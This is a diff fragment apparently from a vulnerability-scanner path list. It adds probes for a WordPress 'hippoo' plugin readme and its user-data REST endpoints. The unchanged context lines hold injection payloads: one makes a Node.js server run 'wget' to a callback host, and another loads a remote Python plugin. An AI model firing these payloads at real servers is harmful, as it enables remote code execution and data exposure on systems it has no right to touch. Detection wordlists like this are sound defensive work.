@@ -344,3 +344,6 @@
 /page?settings[view%20options][closeDelimiter]=x%22)%3bprocess.mainModule.require(%27child_process%27).execSync(%27wget+http://{{interactsh-url}}%27)%3b//
 /connectioncheck.php?ip={{url_encode(
 /rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
+/wp-content/plugins/hippoo/readme.txt
+/?rest_route=/wc-hippoo/v1/ext/wp/v2/users/1
+/wp-json/wc-hippoo/v1/ext/wp/v2/users/1
